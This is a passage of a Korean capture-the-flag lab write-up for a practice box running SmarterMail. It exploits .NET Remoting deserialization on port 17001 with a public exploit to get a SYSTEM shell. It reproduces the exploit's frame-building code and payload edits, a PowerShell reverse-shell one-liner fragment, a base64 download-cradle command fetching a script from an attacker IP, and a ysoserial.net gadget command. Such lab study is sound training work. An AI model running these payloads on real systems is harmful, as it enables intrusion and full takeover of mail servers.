> 1. **어떤 직렬화기인가** — `BinaryFormatter`/`ObjectStateFormatter`/`LosFormatter`/`NetDataContractSerializer`면 즉시 RCE 후보
> 2. **가젯이 실행되는 트리거** — `OnDeserialization`, `ISerializable` 생성자, `IDeserializationCallback`, 그리고 자바라면 `readObject`/`readResolve`
> 3. **전달 경로** — 쿠키, ViewState, HTTP 본문, 그리고 이 박스처럼 원시 TCP
> 4. **자바 등가물** — `CommonsCollections1~7`, `Spring1`, `Jdk7u21`. `ysoserial`(자바)/`ysoserial.net`(닷넷)은 개념이 같고 이름만 다름

### 2-6. 프레임 해부 — .NET Remoting TCP 와이어 포맷

익스플로잇이 소켓에 쓰는 바이트는 이렇게 조립됨.

```python
uri = bytes('tcp://{}:{}/Servers'.format(HOST, str(PORT)), 'utf-8')

msg = bytes()
msg += b'.NET'                 # Header
msg += b'\x01'                 # Version Major
msg += b'\x00'                 # Version Minor
msg += b'\x00\x00'             # Operation Type
msg += b'\x00\x00'             # Content Distribution
msg += pack('I', len(payload)) # Data Length
msg += b'\x04\x00'             # URI Header
msg += b'\x01'                 # Data Type
msg += b'\x01'                 # Encoding - UTF8
msg += pack('I', len(uri))     # URI Length
msg += uri                     # URI
msg += b'\x00\x00'             # Terminating Header
msg += payload                 # Data
```

| 필드 | 값 | 의미 |
|---|---|---|
| `.NET` | 매직 | HTTP가 아님. 9998로 쏘면 IIS가 `400 Invalid Verb`를 뱉는 이유 |
| Data Length | `pack('I', ...)` | 리틀엔디언 4바이트. 페이로드 길이를 서버가 여기서 읽음 |
| URI | `tcp://192.168.248.65:17001/Servers` | `/Servers`가 등록된 원격 객체 이름. SmarterMail 고유값 |
| Terminating Header | `\x00\x00` | 헤더 끝 표시. 이후가 전부 직렬화 데이터 |

#### `pack('I', ...)` 를 왜 쓰는가

`struct.pack('I', n)`은 부호 없는 32비트 정수를 **호스트 바이트 순서**로 4바이트로 만듦. x86/x64는 리틀엔디언이므로 결과도 리틀엔디언.
엄밀히는 `'<I'`(명시적 리틀엔디언)로 쓰는 것이 정확하나, **Kali(x86_64)에서 돌리는 한 결과가 같음.** 빅엔디언 머신에서 이 스크립트를 돌리면 깨진다는 것만 알아둘 것.

### 2-7. 왜 하필 1360바이트 패딩인가 — 이 노트에서 가장 중요한 디테일

익스플로잇 코드는 다음과 같음.

```python
psh_shell = psh_shell.encode('utf-16')[2:] # remove BOM
psh_shell = base64.b64encode(psh_shell)
psh_shell = psh_shell.ljust(1360, b' ')
...
payload = base64.b64decode(payload)
payload = payload.replace(bytes("X"*1360, 'utf-8'), psh_shell)
```

**`X` 1360개를 base64 페이로드로 갈아끼움.** 왜 정확히 1360인가?

디코드한 직렬화 스트림에서 그 문자열 바로 앞 바이트를 뜯어보면 답이 나옴.

```bash
┌──(kali㉿kali)-[~/PG/Algernon]
└─$ python3 - <<'EOF'
import base64,re
src=open('exploit_algernon.py').read()
p=base64.b64decode(re.search(r"^payload = '(.*)'$", src, re.M).group(1))
i=p.find(b'/c powershell')
print('prefix bytes before /c :', p[i-4:i])
print('cmdstring:', p[i:i+40])
print('X count:', p.count(b'X'))
print('len of "/c powershell.exe -encodedCommand ":', len('/c powershell.exe -encodedCommand '))
print('7bit len decode:', (p[i-2]&0x7f) | (p[i-1]<<7))
EOF
prefix bytes before /c : b'\x00\x00\xf2\n'
cmdstring: b'/c powershell.exe -encodedCommand XXXXXX'
X count: 1360
len of "/c powershell.exe -encodedCommand ": 34
7bit len decode: 1394
```

**계산이 정확히 맞음.**

- `BinaryFormatter`의 `BinaryObjectString` 레코드는 문자열 앞에 7비트 인코딩 길이 접두사(7-bit encoded int)를 둠
- 그 접두사가 `\xf2\x0a` = `(0xF2 & 0x7F) | (0x0A << 7)` = `114 + 1280` = 1394
- 실제 문자열은 `"/c powershell.exe -encodedCommand "`(34바이트) + `X` 1360개 = **1394바이트**

> [!danger] 여기가 이 익스플로잇의 진짜 함정
> **길이 접두사 1394는 base64 페이로드 안에 이미 굳어 있음.** 페이로드 생성기를 다시 돌리지 않는 한 바꿀 수 없음.
> 따라서 **치환되는 문자열은 반드시 정확히 1360바이트여야 함.**
> - **짧으면**: `ljust(1360, b' ')`가 공백으로 채워줌. 문제없음
> - **길면**: `ljust`는 자르지 않음. 문자열이 1360을 넘어가고, 서버는 접두사가 시킨 1394바이트만 문자열로 읽은 뒤 남은 바이트를 다음 레코드로 해석 → 스트림 파싱 실패 → 아무 일도 일어나지 않음
>
> 그리고 **실패해도 스크립트는 아무 말 없이 `EXIT=0`으로 끝남.** 원인을 알 방법이 없음.

**남은 여유가 얼마나 되는지 실측.**

```bash
┌──(kali㉿kali)-[~/PG/Algernon]
└─$ python3 - <<'EOF'
... exploit_algernon.py 의 psh_shell 생성 5줄을 그대로 단계별 실행 ...
EOF
psh chars: 500
utf16le bytes: 1000
b64 len: 1336
after ljust: 1360 pad spaces: 24
```

- PowerShell 원라이너: 500자
- UTF-16LE 인코딩 후: 1000바이트 (한 글자당 2바이트)
- base64: 1336자 (`ceil(1000/3) × 4`)
- 패딩 공백: 24개

**여유는 24바이트뿐.** base64는 원본 1.5자당 4자로 불어나므로, 원라이너에 문자 10개만 더 붙어도 1360을 넘김.

| 만약 이렇게 바꾸면 | 결과 |
|---|---|
| `LPORT=80` → `LPORT=4444` | 원라이너 +2자 → b64 +4자 → 1340. 안전 |
| `LHOST`가 15자(`192.168.100.207`) + `LPORT=44444` | 원라이너 +6자 → b64 약 +8자 → 1344. 아슬아슬하게 안전 |
| 원라이너에 AMSI 우회 한 줄 추가 | 거의 확실히 초과 → 조용한 실패 |

> [!tip] 시험 반사 — 공개 익스플로잇의 하드코딩된 크기를 만나면
> `X`·`A`·`\x90` 같은 문자가 수백~수천 개 반복돼 있으면 그것은 **자리표시자이자 크기 제약**.
> 페이로드를 손대기 전에 **"이 자리에 몇 바이트까지 들어가는가"를 먼저 계산하라.** 버퍼 오버플로 익스플로잇의 오프셋과 정확히 같은 사고방식.
> 초과했는지 확인하는 가장 싼 방법 — `len()`을 찍어보는 `print` 한 줄 추가.

### 2-8. PowerShell `-EncodedCommand`가 왜 UTF-16LE를 요구하는가

```python
psh_shell = psh_shell.encode('utf-16')[2:] # remove BOM
psh_shell = base64.b64encode(psh_shell)
```

- **`.encode('utf-16')`** — Python의 `utf-16` 코덱은 앞에 BOM `\xff\xfe` 를 붙이고 리틀엔디언으로 인코딩함
- **`[2:]`** — 그 BOM 2바이트를 잘라냄. 결과는 순수 UTF-16LE
- 그 다음 base64

**왜 UTF-16LE인가.** Windows의 네이티브 문자열 표현이 UTF-16LE이기 때문. `powershell.exe -EncodedCommand`는 **base64를 디코드한 결과를 그대로 `wchar_t*`로 취급함. UTF-8을 넣으면 각 ASCII 바이트가 절반씩 잘못 짝지어져 한자·기호 범벅**이 되고 파서가 죽음.

**동등한 수동 생성법 (시험장에서 손으로 만들 때)**

```bash
# Linux/Kali — iconv 로 UTF-16LE 변환
echo -n 'IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.207/s.ps1")' \
  | iconv -f UTF-8 -t UTF-16LE | base64 -w0

# Python 한 줄
python3 -c "import base64;print(base64.b64encode(open('cmd.txt','rb').read().decode().encode('utf-16le')).decode())"
```

```powershell
# Windows 안에서 만들 때
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('<명령>'))
# ↑ .NET 의 Encoding.Unicode 가 바로 UTF-16LE 다. UTF8 이 아니다
```

> [!warning] `-w0` 를 빼면 실패함
> GNU `base64`는 기본적으로 76자마다 줄바꿈을 넣음. 그 개행이 명령줄에 들어가면 인자가 쪼개짐. **`-w0`(줄바꿈 없음)는 선택이 아니라 필수.**
> 이 함정은 [[Squid]]의 `-enc` 사용 사례와 동일함.

**`-enc`를 쓰는 진짜 이유** — 인코딩은 탐지 회피보다 인용부호 붕괴 회피가 목적임. 이 박스에서 페이로드는 `Python 문자열 → base64 직렬화 스트림 → cmd.exe 명령줄 → powershell.exe 인자`라는 4중 경유를 거침. 원라이너에는 `"`·`$`·`|`·`&`·`>`가 전부 들어 있어 그대로는 어느 계층에서든 반드시 깨짐. base64는 `A-Za-z0-9+/=`뿐이라 어느 셸에서도 특수문자가 없음.

> [!tip] 누적 패턴 — "인용이 깨지면 인코딩으로 도망간다"
> [[Hawat]]은 hex 리터럴, [[Exfiltrated]]는 base64, [[Squid]]는 hex + `-enc` + 배치 래핑. **이 박스는 base64 + UTF-16LE.**
> 규칙 — **경유 계층이 2개를 넘으면 인용부호로 싸우지 말고 인코딩으로 우회할 것.** 6장 ③의 실패가 정확히 이 규칙을 어겼을 때 일어남.

### 2-9. 왜 리버스셸 포트를 80으로 잡았는가

```python
LPORT=80
```

기본값 4444를 그대로 쓰지 않음.

| 이유 | 설명 |
|---|---|
| 아웃바운드 필터 회피 | 방화벽이 아웃바운드를 제한하더라도 80/443은 열어두는 것이 거의 관례. 4444는 IDS 시그니처에도 걸림 |
| 성공 신호가 없기 때문 | 이 익스플로잇은 실패를 알려주지 않음. "페이로드가 안 터진 것"과 "터졌는데 아웃바운드가 막힌 것"을 구분할 수 없음. 그래서 아웃바운드 변수부터 제거하고 시작 |
| 재시도 비용이 큼 | 실패하면 원인 후보가 여러 개라 절약이 안 됨. 첫 발사에서 변수 하나를 미리 없애는 쪽이 저렴 |

`80`은 특권 포트이므로 리스너에 **`sudo`가 필요함.** 이걸 잊으면 `Permission denied`가 나고, tmux 안에서 돌리면 그 에러를 보지 못한 채 "리스닝 중"이라고 착각하게 됨 → 6장 ①과 정확히 같은 사고.

> [!tip] 리버스셸이 안 붙으면 무엇을 의심하나 (순서대로)
> 1. **리스너가 진짜 그 포트에 있는가** — `ss -lntp | grep :80`. `sudo` 누락으로 안 떠 있는 경우가 1위
> 2. **VPN 인터페이스 IP가 맞는가** — `ip a show tun0`. `eth0` IP를 적는 실수가 2위
> 3. **아웃바운드 필터** — 80/443/53으로 바꿔본다
> 4. **페이로드 자체가 안 터졌다** — 이 박스라면 1360 초과를 의심
> 5. **바인드셸로 전환** — 아웃바운드가 완전히 막혔다면 역방향을 포기

---

## 3. Foothold — 17001로 원샷

### 3-1. 익스플로잇 확보

```bash
┌──(kali㉿kali)-[~/PG/Algernon]
└─$ searchsploit smartermail
# → SmarterMail Build 6985 - Remote Code Execution | windows/remote/49216.py
└─$ searchsploit -m 49216
```

**원본은 반드시 보존.** 수정본은 별도 파일로 생성 — 무엇을 바꿨는지 나중에 diff로 증명할 수 있어야 하고, 잘못 고쳤을 때 되돌릴 원본이 필요함.

```bash
└─$ cp 49216.py exploit_algernon.py
```

### 3-2. 무엇을 바꿨는가 — diff 전문

```bash
┌──(kali㉿kali)-[~/PG/Algernon]
└─$ diff -u 49216.py exploit_algernon.py
--- /home/kali/PG/Algernon/49216.py	2026-08-20 10:59:28.921905973 +0900
+++ /home/kali/PG/Algernon/exploit_algernon.py	2026-08-20 11:00:09.985140672 +0900
@@ -18,10 +18,10 @@
 import sys
 from struct import pack

-HOST='192.168.1.1'
+HOST='192.168.248.65'
 PORT=17001
-LHOST='192.168.1.2'
-LPORT=4444
+LHOST='192.168.45.207'
+LPORT=80

 psh_shell = '$client = New-Object System.Net.Sockets.TCPClient("'+LHOST+'",'+str(LPORT)+');...
```

**바꾼 것은 변수 3개뿐.**

| 변수 | 원본 | 수정 | 이유 |
|---|---|---|---|
| `HOST` | `192.168.1.1` | `192.168.248.65` | 타겟 |
| `PORT` | `17001` | 그대로 | .NET Remoting 포트. 이 값이 이미 맞다는 것이 이 익스플로잇이 이 박스용임을 확인해줌 |
| `LHOST` | `192.168.1.2` | `192.168.45.207` | 공격자 tun0. `eth0`가 아님 |
| `LPORT` | `4444` | `80` | 2-9절 참조 |

> [!warning] 공개 익스플로잇을 수정할 때의 원칙
> **최소 수정.** 특히 이 스크립트에서는 `psh_shell` 원라이너와 `payload` base64는 절대 손대지 않음 — 2-7절의 1360바이트 제약 때문.
> 그리고 수정 전 반드시 코드를 끝까지 읽어라. 이 스크립트는 아웃바운드 소켓만 열지만, EDB에는 **공격자를 향한 백도어가 심긴 "가짜 익스플로잇"**이 실제로 존재함. 파이썬이라 읽기 쉬우니 핑계가 없음.

### 3-3. 리스너 준비 — 세션은 하나씩

```bash
# ⚠️ 반드시 별도의 SSH 호출로, 한 번에 하나씩 만든다 (6장 ① 참조)
ssh kali@10.44.44.128 "tmux new-session -d -s alg80 'sudo nc -lvnp 80 | tee ~/PG/Algernon/shell_session.log'"

# 만든 직후 반드시 검증한다 — 만들었다는 사실과 붙어 있다는 사실은 다르다
ssh kali@10.44.44.128 "ss -lntp | grep ':80 '"
ssh kali@10.44.44.128 "tmux ls"
# alg80: 1 windows (created Thu Aug 20 11:01:19 2026)
```

> [!danger] `ss -lntp`로 "LISTEN"을 확인해도 충분하지 않음
> 6장 ①에서 실제로 겪은 일 — 포트는 전부 LISTEN이었는데 **어느 tmux 세션이 어느 포트를 잡고 있는지가 뒤바뀌어 있었음.** 셸이 들어오면 엉뚱한 pane에 뜨고, 빈 pane을 보며 "실패했다"고 판단하게 됨.
> 검증은 **`ss -lntp`의 PID를 tmux pane의 PID와 대조**하거나, 애초에 세션을 하나만 만들어 애매함을 없앨 것.

### 3-4. 발사

```bash
┌──(kali㉿kali)-[~/PG/Algernon]
└─$ python3 exploit_algernon.py
┌──(kali㉿kali)-[~/PG/Algernon]
└─$ echo $?
0
```

**출력이 전혀 없음.** 스크립트는 `s.send(msg)` 후 `s.close()`로 끝남 — 응답을 읽지도, 성공 여부를 판정하지도 않음.

> [!danger] `EXIT=0`은 "성공"이 아니라 "파이썬이 예외 없이 끝났다"는 뜻일 뿐
> 이 스크립트가 `0`을 반환하는 조건은 TCP 연결이 맺어지고 바이트를 write 했다는 것뿐임. 서버가 그 바이트를 파싱했는지, 가젯이 돌았는지, 프로세스가 떴는지는 **아무것도 검증하지 않음.**
> **진실은 리스너에만 있음.** 발사 후 즉시 리스너 pane을 확인하고, 15~20초 기다려도 아무것도 없으면 실패로 판정.
> 누적 패턴 **"응답이 성공을 뜻하지 않는다"**([[Crane]] · [[RubyDome]] · [[Astronaut]] · [[Exghost]] · [[Hawat]] · [[Squid]])의 가장 극단적인 형태 — 여기엔 응답조차 없음.

### 3-5. 셸 도착

```
┌──(kali㉿kali)-[~/PG/Algernon]
└─$ sudo nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.45.207] from (UNKNOWN) [192.168.248.65] 49731
whoami
nt authority\system
PS C:\Windows\system32>
```

**첫 명령에서 `nt authority\system`.** 권한상승 단계가 존재하지 않음.

출발지 포트 `49731`은 Windows 동적 포트 범위(49152–65535)의 값으로, **타겟이 우리 쪽으로 나온 연결(리버스)**임을 확인시켜 줌.

#### 프롬프트가 `PS C:\Windows\system32>` 인 이유

원라이너 리버스셸이 매 명령 후 `"PS " + (pwd).Path + "> "` 를 직접 붙여 보내기 때문. **진짜 PowerShell 콘솔이 아님.**
실무적 차이 —
- **탭 완성·화살표 히스토리·Ctrl+C 없음** — nc의 raw 소켓일 뿐
- **대화형 프로그램 사용 불가** — `more`, 자격증명 프롬프트 등에서 멈춤
- **`cd`는 유지됨** — 셸이 한 프로세스 안에서 `iex`를 반복하므로 상태가 살아 있음
- **리눅스의 `python3 -c 'import pty'` TTY 업그레이드는 해당 없음.** Windows에서 진짜 TTY가 필요하면 RDP·WinRM·`ConPtyShell`로 갈아타야 함

### 3-6. ⚠️ Metasploit 대안 — 존재하지만 쓰지 않음

동일 취약점을 다루는 모듈이 실제로 있음.

```
exploit/windows/http/smartermail_rce                     (Rank: excellent)
post/windows/gather/credentials/smartermail
```

> [!danger] ⚠️ 시험 금지 — Metasploit은 단 1대에만 허용
> OSCP 시험 규정상 Metasploit 익스플로잇 모듈/`meterpreter`/`post` 모듈은 **시험 전체를 통틀어 단 한 대의 타겟**에만 쓸 수 있음. (`msfvenom`으로 페이로드를 만드는 것과 `multi/handler`로 받는 것은 이 제한에 포함되지 않음.)
>
> **판단 과정:**
> 1. EDB 49216은 **순수 Python + 표준 라이브러리(`base64`·`socket`·`struct`)** 뿐. Metasploit 프레임워크에 전혀 의존하지 않음
> 2. **단일 CVE의 독립 PoC**이므로 "자동 익스플로잇 도구"에 해당하지 않음 → OSCP 허용
> 3. 두 경로의 **결과가 동일** — 어느 쪽이든 `MailService`가 `LocalSystem`이므로 곧바로 SYSTEM
> 4. 결과가 같은데 **제한된 카드를 여기서 태울 이유가 없음.** Metasploit 1회는 정말로 수동 익스플로잇이 안 되는 박스를 위해 남겨둠
>
> **결론 — 이 박스에서 Metasploit을 쓰는 것은 순수한 손해.**

**만약 EDB 스크립트가 없었다면 — 완전 수동 대안**

```bash
# 1) 가젯 체인을 직접 생성 (Windows 또는 mono 필요)
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 \
  -c "powershell -enc <UTF16LE-base64>"

# 2) .NET Remoting 프레임으로 감싸 17001 로 전송
#    → EDB 49216 의 msg 조립 부분(2-6절)을 그대로 쓴다.
#      바뀌는 것은 payload 변수 하나뿐이다.
```

> [!tip] 이 조합이 중요한 이유
> `ysoserial.net`으로 직접 만든 가젯 체인은 **1360바이트 제약에서 자유로움** — 길이 접두사를 생성기가 알아서 계산해 주기 때문.
> 즉 **긴 페이로드가 필요하면 EDB 스크립트를 고치는 것이 아니라 체인을 새로 생성하는 것이 정답.**

---

## 4. 권한상승 — 없음. 왜 없는지가 학습 포인트

### 4-1. 셸을 잡자마자 친 명령과 그 출력

```powershell
PS C:\Windows\system32> whoami; Get-Date
nt authority\system

Wednesday, August 19, 2026 7:09:00 PM

PS C:\Windows\system32> systeminfo | Select-String -Pattern "OS Name","OS Version","System Type","Domain"

OS Name:                   Microsoft Windows 10 Pro
OS Version:                10.0.18363 N/A Build 18363
System Type:               x64-based PC
BIOS Version:              VMware, Inc. VMW71.00V.21100432.B64.2301110304, 1/11/2023
Domain:                    WORKGROUP

PS C:\Windows\system32> Get-CimInstance Win32_Service | Where-Object {$_.Name -like "*mail*"} | Select-Object Name,StartName,State,PathName | Format-List

Name      : MailService
StartName : LocalSystem
State     : Running
PathName  : "C:\Program Files (x86)\SmarterTools\SmarterMail\Service\MailService.exe"
```

### 4-2. `StartName : LocalSystem` 을 읽는 법

Windows 서비스는 실행 계정을 반드시 하나 가짐. **그 계정이 곧 익스플로잇 성공 시 얻는 권한.**

| `StartName` | 익스플로잇하면 무엇을 얻는가 | 다음 수 |
|---|---|---|
| `LocalSystem` | `NT AUTHORITY\SYSTEM` | 끝. 권한상승 불필요 |
| `NT AUTHORITY\LocalService` | `LOCAL SERVICE` — 특권이 박탈된 상태 | FullPowers로 특권 복원 → PrintSpoofer/Potato ([[Squid]] 참조) |
| `NT AUTHORITY\NetworkService` | `NETWORK SERVICE` | 동일. `SeImpersonatePrivilege` 확인 |
| `IIS APPPOOL\<pool>` | 앱풀 아이덴티티 | 동일. `whoami /priv` |
| 도메인/로컬 사용자 계정 | 그 사용자 | 서비스 계정의 평문 비밀번호가 레지스트리에 있을 수 있음 |

> [!tip] 시험 반사 — Windows 셸을 잡으면 무조건 이 5개부터
> 리눅스의 `id` · `sudo -l` · `find / -perm -4000` · `getcap -r /` · `crontab -l` 에 대응하는 Windows 세트.
> ```powershell
> whoami                                       # 1. 나는 누구인가 ← SYSTEM 이면 여기서 끝
> whoami /priv                                 # 2. SeImpersonate / SeBackup / SeDebug 가 있는가
> whoami /groups                               # 3. Administrators 멤버인가
> systeminfo                                   # 4. OS 빌드·핫픽스 (커널 익스플로잇 판단)
> Get-CimInstance Win32_Service | Select Name,StartName,State,PathName   # 5. 서비스 계정과 경로
> ```
> `whoami` 하나로 4장이 통째로 사라질 수 있음. 그런데도 열거를 먼저 시작해 30분을 태우는 일이 흔함. **첫 명령은 항상 `whoami`.**

### 4-3. 이 박스에서 검토하지 않은 권한상승 경로

SYSTEM을 이미 얻었으므로 아래는 **전부 불필요.** 다만 "만약 `LOCAL SERVICE`였다면"의 대비로 적어둠.

| 경로 | 이 박스에서의 상태 |
|---|---|
| `SeImpersonatePrivilege` → PrintSpoofer/Potato | 불필요. 이미 SYSTEM |
| 서비스 바이너리 경로에 따옴표 없는 공백(unquoted service path) | `PathName`이 따옴표로 감싸져 있음 → 해당 없음 |
| 서비스 바이너리 쓰기 권한 | 확인하지 않음 `[가정]`. SYSTEM이므로 무의미 |
| AlwaysInstallElevated / 저장된 자격증명 | 확인하지 않음 |
| 커널 익스플로잇 (Build 18363) | 불필요. 시험에서는 최후 수단이며 박스를 죽일 위험이 큼 |

---

## 5. 플래그

```
PS C:\Windows\system32> whoami; hostname; type C:\Users\Administrator\Desktop\proof.txt
nt authority\system
algernon
6126cdddc1ed43d92e8a34f71ecda278
```

| 플래그 | 경로 | 값 |
|---|---|---|
| `proof.txt` | `C:\Users\Administrator\Desktop\proof.txt` | `6126cdddc1ed43d92e8a34f71ecda278` |
| `local.txt` | 존재하지 않음 | — |

제출 결과: **Correct, +5 XP**.

### 5-1. `local.txt`가 없다는 것을 어떻게 확정했는가

"못 찾았다"와 "없다"는 다름. 사용자 프로필을 전수로 확인함.

```powershell
PS C:\Windows\system32> Get-ChildItem C:\Users -Directory | Select-Object -Expand Name
.NET v4.5
.NET v4.5 Classic
Administrator
dean
DefaultAppPool
Public

PS C:\Windows\system32> Get-ChildItem C:\Users\dean\Desktop, C:\Users\Administrator\Desktop -Force -ErrorAction SilentlyContinue | Select-Object FullName

FullName
--------
C:\Users\dean\Desktop\desktop.ini
C:\Users\dean\Desktop\Microsoft Edge.lnk
C:\Users\Administrator\Desktop\desktop.ini
C:\Users\Administrator\Desktop\proof.txt
C:\Users\Administrator\Desktop\Microsoft Edge.lnk
```

- 실제 사람 계정은 **`dean`과 `Administrator` 둘뿐** (`.NET v4.5`·`DefaultAppPool`은 앱풀 프로필, `Public`은 공용)
- 두 Desktop을 `-Force`로 조회 — 숨김·시스템 속성 파일까지 포함
- `dean`의 Desktop에는 `desktop.ini`와 바로가기뿐. **`local.txt`는 애초에 배치되지 않음**

> [!warning] `-Force` 없이 조회했다면 오판했을 것
> PG의 플래그 파일은 **숨김 속성이 붙어 있는 경우가 있음.** `Get-ChildItem`/`dir`은 기본적으로 숨김 파일을 보여주지 않음.
> - PowerShell: `Get-ChildItem -Force`
> - cmd: `dir /a`
>
> `-ErrorAction SilentlyContinue`는 접근 거부 항목에서 멈추지 않고 계속 훑기 위한 것. **SYSTEM이라도 일부 항목에서 에러가 날 수 있고, 그때 스크립트 전체가 멈추면 결과가 잘림.**

### 5-2. 시험 증거 형식 — 한 화면에 담을 것

```powershell
whoami; hostname; ipconfig; type C:\Users\Administrator\Desktop\proof.txt
```

**플래그 값만 캡처한 스크린샷은 인정되지 않음.** `whoami`(권한) + `hostname`(어느 박스인지) + `ipconfig`(타겟 IP) + 플래그가 한 화면에 있어야 함. 리눅스의 `id; hostname; ip a; cat proof.txt`와 같은 관례.

---

## 6. 막혔던 지점 / 시행착오

### 이 장이 가장 중요한 이유

성공 경로는 약 9분(10:59:00 빠른 스캔 → 11:08 플래그). 그런데 실제로 태운 시간의 대부분은 **인프라 실수를 알아채는 데** 들어감.
시험장에서 시간을 잡아먹는 것은 익스플로잇이 아니라 **"실패했는지 성공했는지 모르는 상태"**임.

### ① tmux 세션 경쟁 상태 — 겉으로는 완벽히 정상

**무엇을 했는가.** 여러 포트에서 동시에 리스닝하려고 한 SSH 명령 안에서 tmux 세션 3개를 연달아 만듦.

```bash
# ✗ 이렇게 했다 — 하지 마라
ssh kali@10.44.44.128 "tmux new-session -d -s alg 'sudo nc -lvnp 80'; \
                       tmux new-session -d -s alg443 'sudo nc -lvnp 443'; \
                       tmux new-session -d -s alg53 'sudo nc -lvnp 53'"
```

**무엇이 일어났는가.** pane 매핑이 뒤엉켜 `alg` 세션이 80이 아니라 53번을 리스닝하게 됨.

**왜 알아채기 어려웠는가.** `ss -lntp`를 보면 세 포트가 전부 LISTEN 상태.

```
LISTEN  0  10  0.0.0.0:80    ...  users:(("nc",pid=...))
LISTEN  0  10  0.0.0.0:443   ...  users:(("nc",pid=...))
LISTEN  0  10  0.0.0.0:53    ...  users:(("nc",pid=...))
```

**"포트가 열려 있는가"에는 아무 문제가 없었음.** 틀린 것은 "어느 세션 이름이 어느 포트에 대응하는가" 뿐. 그래서 익스플로잇을 쏜 뒤 `alg` 세션을 들여다보며 "아무것도 안 들어왔다 → 실패했다"고 오판. 첫 발사가 헛돈 원인일 가능성이 큼 `[가정]` — 셸이 실제로 다른 pane에 떨어졌는지는 확인하지 못함.

**원인.** `tmux new-session -d`가 서버 기동/세션 등록을 비동기로 처리하는데, 세 개를 밀어 넣으면 등록 순서와 명령 실행 순서가 어긋남 `[가정]`.

**해결.**

```bash
# ✓ 세션 하나 = SSH 호출 하나. 그리고 즉시 검증
ssh kali@10.44.44.128 "tmux new-session -d -s alg80 'sudo nc -lvnp 80 | tee ~/PG/Algernon/shell_session.log'"
ssh kali@10.44.44.128 "tmux ls"
ssh kali@10.44.44.128 "ss -lntp | grep ':80 '"
```

> [!danger] 일반화 — 인프라를 만든 다음에는 반드시 검증할 것
> "만들었다"와 "의도한 대로 붙어 있다"는 다른 명제. 리스너·터널·포트포워딩·프록시는 **전부** 이 함정을 가짐.
> 검증 비용은 몇 초, 오판 비용은 수십 분. 그리고 **여러 개를 동시에 만들지 마라** — 하나면 애매함 자체가 생기지 않음.

### ② `sudo pkill -f 'nc -lvnp'` 가 tmux 서버 전체를 죽임

**무엇을 했는가.** 잘못 만든 리스너를 정리하려고 패턴 kill 사용.

```bash
# ✗ 이 명령이 사고를 냈다
sudo pkill -f 'nc -lvnp'
```

**무엇이 일어났는가.** 리스너뿐 아니라 tmux 서버가 통째로 내려감. 진행 중이던 nmap 세션과, 완전히 무관한 다른 박스의 작업 세션까지 함께 죽음.

**왜 그렇게 됐는가.** `pkill -f`는 전체 커맨드라인에 정규식을 맞춤. tmux가 pane 프로세스를 띄울 때의 커맨드라인에도 `nc -lvnp` 문자열이 들어가므로 tmux가 관리하는 프로세스들이 광범위하게 매치됨 `[가정]`. `sudo`까지 붙어 있어 소유자 제한도 없었음.

**해결 — 대상을 좁힘.**

```bash
# ✓ 포트를 정확히 지정해 그 리스너만
sudo fuser -k 80/tcp

# ✓ 또는 PID를 먼저 확인하고 그것만
ss -lntp | grep ':80 '
sudo kill <PID>

# ✓ tmux 세션 단위로 정리 (다른 세션은 건드리지 않는다)
tmux kill-session -t alg80
```

> [!danger] `pkill -f` 는 실전에서 쓰지 마라
> 특히 `sudo`와 함께는 더욱. 랩에서는 내 작업만 날아가지만, **실무 침투 테스트에서 이걸 고객 서버에 치면 사고 보고서를 쓰게 됨.**
> 규칙 — **kill은 PID로.** 패턴으로 죽여야 한다면 먼저 `pgrep -af '<패턴>'`으로 무엇이 매치되는지 눈으로 확인할 것.

### ③ 다중 경유 셸에서 이스케이프가 붕괴함

**무엇을 했는가.** 리버스셸 안에서 플래그 파일을 전역 검색하려고 `cmd /c` 사용.

```
PS C:\Windows\system32> cmd /c "dir C:\ /s /b 2>/dev/null | findstr /i \"proof.txt local.txt\""
PS C:\Windows\system32>
```

**무엇이 일어났는가.** 아무 출력도 없이 프롬프트만 돌아옴. 에러도 없었음.

**무엇이 깨졌는가 — 두 가지가 동시에 망가짐.**

1. **`2>nul`이 `2>/dev/null`로 변형됨.** 원래 치려던 것은 Windows의 `2>nul`인데, 경유 계층 어딘가에서(또는 손버릇으로) 리눅스 문법이 섞여 들어감. Windows에서 `/dev/null`은 경로로 해석되어 리다이렉트가 실패함
2. **중첩 따옴표가 붕괴함.** `cmd /c "... \"proof.txt local.txt\""` 는 `SSH → tmux send-keys → nc 소켓 → PowerShell iex → cmd.exe` 라는 5중 경유를 거침. 각 계층이 백슬래시와 큰따옴표를 자기 방식으로 소비하므로, `findstr`에 도착할 무렵에는 원래 문자열이 아님

**어떻게 알아챘는가.** `dir C:\ /s /b`는 어떤 상황에서도 수만 줄을 뱉음. 출력이 0줄이라는 것은 "찾는 파일이 없다"가 아니라 "명령 자체가 실행되지 않았다"는 뜻임. 결과가 "없음"일 때 명령이 정말 돌았는지부터 의심할 것.

**해결 — 경유를 하나 줄임.**

```powershell
# ✓ cmd.exe 를 거치지 않는다. PowerShell 네이티브만 쓴다
Get-ChildItem C:\Users -Directory | Select-Object -Expand Name
Get-ChildItem C:\Users\dean\Desktop, C:\Users\Administrator\Desktop -Force -ErrorAction SilentlyContinue | Select-Object FullName
```

- `cmd /c`를 없애서 경유 계층이 5→4로 줄어듦
- **중첩 따옴표가 아예 없음.** 경로를 쉼표로 나열하고 파이프 대신 cmdlet 파라미터를 씀
- `2>nul` 대신 `-ErrorAction SilentlyContinue` — PowerShell 고유 문법이라 리눅스 문법과 섞일 여지가 없음

> [!tip] 일반화 — 경유 계층이 3개를 넘으면
> 1. **중첩 따옴표를 쓰지 마라.** 쉼표 나열·배열·cmdlet 파라미터로 바꿀 것
> 2. **셸 문법을 섞지 마라.** PowerShell 셸이면 PowerShell 문법만. `2>nul`(cmd)도 `2>/dev/null`(sh)도 쓰지 않음
> 3. **정 복잡하면 인코딩** — `powershell -enc <base64>`. 특수문자가 사라짐 (2-8절)
> 4. **또는 파일로 뺄 것** — 스크립트를 파일에 쓰고 실행. [[Squid]]에서 배치 래핑으로 해결한 것과 같은 수법
> 5. **결과가 비었으면 "명령이 실행됐는가"부터 검증** — 반드시 출력이 나오는 명령(`whoami`)을 같은 방식으로 한 번 쳐볼 것

### ④ 브리핑의 빌드 번호가 틀림 — 남의 정찰 결과를 믿은 대가

**무엇이 잘못돼 있었는가.** 사전 정보에 "SmarterMail build 6985"라고 적혀 있었음. 실제는 6919.

